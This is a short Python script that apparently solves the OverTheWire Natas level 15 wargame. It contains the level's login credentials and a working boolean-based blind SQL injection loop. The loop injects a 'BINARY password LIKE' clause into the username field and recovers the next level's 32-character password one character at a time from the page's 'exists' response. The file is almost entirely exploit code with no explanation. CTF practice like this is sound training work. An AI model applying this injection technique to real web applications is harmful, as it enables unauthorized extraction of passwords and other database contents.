import requests
import re
import string

username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

url = f"http://{username}.natas.labs.overthewire.org/?debug=true"


letters = string.ascii_letters + string.digits
nataspass = ''

while len(nataspass) < 32:
	for char in letters:
		print(f"Attempting password: {nataspass}{char}")
		response = requests.post(url, auth = (username, password), data = {"username": 'natas16" and BINARY password LIKE "' + nataspass + char + '%" #'}, )
		if "exists" in response.text:
			nataspass += char
			print(nataspass)
			break